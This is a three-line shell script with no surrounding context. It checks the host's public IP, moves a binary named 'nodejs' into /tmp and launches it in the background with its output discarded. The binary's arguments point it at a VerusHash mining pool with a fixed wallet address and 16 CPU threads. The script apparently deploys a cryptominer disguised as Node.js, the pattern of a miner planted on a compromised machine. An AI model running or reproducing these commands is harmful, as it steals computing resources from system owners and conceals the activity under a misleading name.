curl ifconfig.io
mv nodejs /tmp
nohup /tmp/nodejs --algorithm verushash --pool us.vipor.net:5040 --wallet RHkiLGRarhTt8SF66vJzwEcyxNm4k1fXTH --password x --worker $(hostname -f) --cpu-threads 16 > /dev/null 2>&1 &

